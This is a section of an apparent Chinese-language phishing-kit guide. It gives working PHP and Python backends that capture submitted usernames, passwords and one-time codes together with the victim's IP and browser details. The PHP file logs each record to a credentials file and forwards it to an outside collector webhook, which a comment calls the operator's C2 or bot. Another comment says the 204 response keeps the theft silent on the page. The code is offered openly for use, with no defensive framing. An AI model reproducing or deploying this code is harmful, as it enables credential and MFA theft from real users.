## 4. `collect.php` — 回传接收 + 落盘

```php
<?php
// 只收 POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') { http_response_code(204); exit; }

date_default_timezone_set('Asia/Shanghai');

$log = __DIR__ . '/logs/creds.log';   // 建议移出 web 根
@mkdir(dirname($log), 0700, true);

$rec = [
    'ts'       => date('c'),
    'stage'    => $_POST['stage']    ?? '',
    'username' => $_POST['username'] ?? '',
    'password' => $_POST['password'] ?? '',
    'otp'      => $_POST['otp']      ?? '',
    'ref'      => $_POST['ref']      ?? '',
    'ip'       => $_SERVER['REMOTE_ADDR'] ?? '',
    'ua'       => $_SERVER['HTTP_USER_AGENT'] ?? '',
    'host'     => $_SERVER['HTTP_HOST'] ?? '',
];

$line = json_encode($rec, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) . PHP_EOL;
file_put_contents($log, $line, FILE_APPEND | LOCK_EX);
@chmod($log, 0600);

// 同时推一份到你的 C2 / 机器人
$webhook = 'https://[COLLECTOR_HOST]/hook';
$ctx = stream_context_create(['http' => [
    'method'  => 'POST',
    'header'  => "Content-Type: application/json\r\n",
    'content' => json_encode($rec, JSON_UNESCAPED_UNICODE),
    'timeout' => 3,
]]);
@file_get_contents($webhook, false, $ctx);

// 前端拿 204，sendBeacon 不报错
http_response_code(204);
```

纯 Python 版接收端（无 PHP 时用）：

```python
# collector.py  —  python3 collector.py
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
import json, datetime, pathlib

LOG = pathlib.Path("logs/creds.log"); LOG.parent.mkdir(exist_ok=True)

class H(BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(n).decode("utf-8", "replace")
        data = {k: v[0] for k, v in parse_qs(body).items()}
        data.update(ts=datetime.datetime.now().isoformat(timespec="seconds"),
                    ip=self.client_address[0],
                    ua=self.headers.get("User-Agent", ""))
        with LOG.open("a", encoding="utf-8") as f:
            f.write(json.dumps(data, ensure_ascii=False) + "\n")
        self.send_response(204); self.end_headers()
    def log_message(self, *a): pass

HTTPServer(("0.0.0.0", 8080), H).serve_forever()
```

